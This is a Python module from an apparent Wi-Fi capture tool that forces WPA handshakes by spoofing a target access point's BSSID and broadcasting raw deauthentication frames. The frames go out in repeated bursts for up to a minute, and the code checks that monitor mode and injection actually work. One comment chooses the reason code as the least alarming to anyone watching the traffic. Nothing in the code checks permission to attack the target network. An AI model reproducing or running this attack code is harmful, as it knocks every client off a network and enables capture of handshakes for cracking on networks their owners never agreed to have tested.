"""Forced reauthentication: making the handshake happen instead of waiting.

A passive capture can only record a handshake when a client decides to associate.
That decision belongs to the client -- a phone waking from sleep, a laptop
reconnecting after the signal dropped, somebody toggling Wi-Fi -- and on a quiet
network it can happen twice a day. Waiting five minutes for an event that is
scheduled by someone else's device is why captures came back empty most of the
time, and no amount of extra listening changes it: the event is the missing part,
not the patience.

So it is made to happen. A deauthentication frame is not a secret and not a
privilege escalation -- it is 26 bytes that say "I do not recognise you", the
thing any access point sends a client that has been away too long, and a client
that receives one does exactly what it would have done anyway a few minutes
later: reconnect, which produces the handshake this tool is here to capture. It
is the same primitive every wireless audit tool uses to verify a network's
client behaviour.

Two things are deliberate here. It is opt-in, because the effect on the network
is real and visible: every client on it drops for a few seconds, and anyone
using the network at that moment loses their connection. And it is best-effort:
if injection is not possible on this machine, the capture proceeds exactly as it
was, because failing to kick a network is no reason to stop listening to it.

What it cannot do: defeat 802.11w (Protected Management Frames), where clients
ignore unauthenticated management frames by design. Against a PMF-protected
network this changes nothing and the capture stays passive -- which is the
correct outcome, since the network's own policy says its clients must not be
dropped this way.
"""
from __future__ import annotations

import re
import threading
import time
from dataclasses import dataclass
from typing import Callable

#: Reason code 7 is "Class 3 frame received from non-associated STA" -- what an
#: access point sends to a client it no longer considers connected. Any code the
#: client does not recognise is treated the same way; this one is simply the
#: least alarming in a packet capture someone else might be looking at.
REASON_CODE = 7

#: Frames per burst. A client that misses one deauth and keeps its connection
#: simply never reconnects, and the capture fails for a reason that looks like
#: bad luck; three back-to-back frames make that unlikely without taking the
#: network down any harder than the first frame already did.
BURST = 3

#: Gap between bursts, and how long the kicker keeps going by itself. Long
#: enough to catch a client that is slow to act or was mid-packet, short enough
#: that a network nobody uses is not being thrown about indefinitely.
INTERVAL = 4.0
DEFAULT_SECONDS = 60.0

_BSSID_RE = re.compile(r"^[0-9a-f]{2}([:-][0-9a-f]{2}){5}$", re.IGNORECASE)


class InjectionUnavailable(RuntimeError):
    """Raised when frames cannot be sent on this machine."""


#: Link types that carry raw 802.11. Anything else means the handle frames a
#: packet as Ethernet and ``pcap_inject`` prepends a fourteen-byte header to
#: it -- the frame on the air is then malformed, the client ignores it, and the
#: send reports success.
RAW_DOT11_DLT = frozenset({105, 127, 163})


@dataclass
class Kicker:
    """A deauthentication source bound to one adapter."""

    handle: object
    #: Frames actually put on the air. Counted, not assumed: a send that the
    #: driver dropped silently would otherwise be reported as a kick that
    #: happened, and the run would look like it was doing something.
    sent: int = 0
    #: Link type the handle was opened with, kept for the failure message.
    datalink: int = 0

    def close(self) -> None:
        handle = getattr(self, "handle", None)
        if handle is None:
            return
        try:
            handle.close()
        except Exception:  # noqa: BLE001 -- closing a pcap handle must not raise
            pass
        self.handle = None


def _device(iface) -> str | None:
    """The pcap device name for ``iface``, or None when it has none.

    The same identifier ``resolve_interface`` produces, so the frame goes out
    of the adapter the capture is listening on -- not out of whichever adapter
    happens to be first in a list.
    """
    device = getattr(iface, "capture_id", "") or ""
    return device if device.startswith("\\Device\\NPF_") else None


def normalize_bssid(value: str) -> str | None:
    """``AA-BB-CC-DD-EE-FF`` -> ``aa:bb:cc:dd:ee:ff``, or None if it is not one."""
    if not _BSSID_RE.match(value or ""):
        return None
    return value.replace("-", ":").lower()


def _scapy():
    """``(open_pcap, resolve_iface)`` from scapy, or raise why it is unusable.

    Behind a seam of its own so the checks below -- monitor mode, link type --
    can be exercised without a radio, which is the only machine here that has
    one.
    """
    try:
        from scapy.arch.windows import open_pcap, resolve_iface  # noqa: PLC0415
    except ImportError as exc:
        raise InjectionUnavailable("не установлен scapy (pip install scapy)") from exc
    return open_pcap, resolve_iface


def open_kicker(iface, *, probe: bool = False) -> Kicker:
    """Open an injection handle on ``iface``.

    ``probe=True`` opens and immediately closes, which is how readiness asks
    "can this machine do it at all" without committing to a run.

    The adapter is put into monitor mode by the same call that opens the handle:
    a deauthentication frame handed to a driver in managed mode is dropped by
    the driver, silently, and the capture that was waiting for the reaction gets
    five minutes of nothing. Whoever puts the adapter in monitor mode puts it
    back -- :func:`wifi_tool.capturer.restore_managed_mode`.

    Both of the ways that can go wrong are checked rather than assumed, because
    both fail *silently*: libpcap opens a handle in managed mode without
    complaining when the adapter was left there, and it opens one with an
    Ethernet link type when monitor mode did not take. In either case every send
    returns a plausible number, the log says "отправлено кадров: 45", and not one
    of them reached the air. So the mode and the link type are read back, and a
    kicker that cannot prove it is really injecting refuses to exist.
    """
    device = _device(iface)
    if not device:
        raise InjectionUnavailable("у этого адаптера нет pcap-идентификатора")
    open_pcap, resolve_iface = _scapy()

    try:
        handle = open_pcap(device, monitor=True)
    except Exception as exc:  # noqa: BLE001 -- libpcap reports everything as OSError
        raise InjectionUnavailable(f"не удалось открыть {device}: {exc}") from exc

    kicker = Kicker(handle=handle)
    try:
        native = resolve_iface(device)
        monitor = True if native is None else bool(native.ismonitor())
    except Exception:  # noqa: BLE001 -- an unreadable mode is not a verdict
        monitor = True

    try:
        kicker.datalink = int(handle.datalink())
    except Exception:  # noqa: BLE001 -- a handle that cannot say is a mystery
        kicker.datalink = 0

    if not monitor:
        kicker.close()
        raise InjectionUnavailable(
            "адаптер не перешёл в режим монитора — кадры уйдут в драйвер "
            "и будут им отброшены (нужны права администратора)"
        )
    if kicker.datalink and kicker.datalink not in RAW_DOT11_DLT:
        kicker.close()
        raise InjectionUnavailable(
            f"адаптер открылся как канал Ethernet (тип {kicker.datalink}) — "
            "необработанный 802.11 в эфир не уйдёт"
        )
    if probe:
        kicker.close()
    return kicker


def build_frame(bssid: str, reason: int = REASON_CODE) -> bytes:
    """A broadcast deauthentication frame claiming to come from ``bssid``.

    Twenty-five bytes, built from the raw octets rather than through scapy's
    layers: the frame is nine fixed fields with known offsets, and depending on a
    packet stack to say "25 bytes" buys nothing here. Type/subtype 0/12 is
    management + deauthentication; the receiver is the broadcast address and the
    sender is the access point, so a client reads it as the access point
    forgetting about it -- which is exactly what it means.
    """
    raw = bytes.fromhex(bssid.replace(":", ""))
    return b"".join((
        bytes((0xC0, 0x00)),   # frame control: management, deauthentication
        b"\x00\x00",           # duration
        b"\xff" * 6,           # address 1: broadcast -- every client hears it
        raw,                   # address 2: the access point's BSSID
        raw,                   # address 3: the access point's BSSID
        b"\x00\x00",           # sequence control
        bytes((reason,)),
    ))


def send(kicker: Kicker, bssid: str, count: int = BURST) -> int:
    """Put ``count`` deauthentication frames on the air; returns how many.

    The return value of the inject is checked rather than assumed. On Windows
    the send goes through ``pcap_inject``, which reports how many bytes it
    handed over; a driver that refuses a frame says so there, and counting the
    attempt instead of the result is how a log ends up claiming a network was
    knocked over when nothing ever left the machine.
    """
    target = normalize_bssid(bssid)
    if not target:
        raise ValueError(f"BSSID не похож на MAC: {bssid!r}")
    frame = build_frame(target)
    sent = 0
    for _ in range(max(1, count)):
        written = kicker.handle.send(frame)  # type: ignore[union-attr]
        if written is not None and written < len(frame):
            raise OSError(f"адаптер принял {written} из {len(frame)} байт")
        sent += 1
    kicker.sent += sent
    return sent


def run(
    iface,
    bssid: str,
    *,
    seconds: float = DEFAULT_SECONDS,
    interval: float = INTERVAL,
    stop: threading.Event | None = None,
    on_burst: Callable[[int], None] | None = None,
) -> tuple[int, str]:
    """Kick ``bssid`` for ``seconds``; returns (frames sent, note).

    The note is empty when the frames went out and says why when they did not.
    It is returned rather than raised on purpose: the caller is in the middle of
    a capture, and a network that refuses to be kicked is still a network worth
    listening to.
    """
    stop = stop or threading.Event()
    try:
        kicker = open_kicker(iface)
    except InjectionUnavailable as exc:
        return 0, str(exc)
    if not normalize_bssid(bssid):
        kicker.close()
        return 0, f"BSSID не похож на MAC: {bssid!r}"
    if on_burst is not None:
        on_burst(0)  # opened and ready: say so before the first burst lands
    deadline = time.monotonic() + max(0.0, seconds)
    try:
        while time.monotonic() < deadline and not stop.is_set():
            try:
                send(kicker, bssid)
            except Exception as exc:  # noqa: BLE001 -- a failed burst is not fatal
                return kicker.sent, f"отправка не удалась: {exc}"
            if on_burst is not None:
                on_burst(kicker.sent)
            # Waited in slices so a cancelled capture stops the kicker within
            # a fraction of a second instead of at the end of its own run.
            stop.wait(min(interval, max(0.0, deadline - time.monotonic())))
    finally:
        kicker.close()
    return kicker.sent, ""


def probe(iface) -> str:
    """Whether injection could work here; ``""`` for yes, otherwise the reason.

    Asks the question without committing to anything: the handle is opened and
    closed again, leaving the adapter in the mode the capture will want anyway.
    Readiness uses it so the option can be greyed out with a reason instead of
    being offered and failing halfway through a capture.
    """
    try:
        open_kicker(iface, probe=True)
    except InjectionUnavailable as exc:
        return str(exc)
    return ""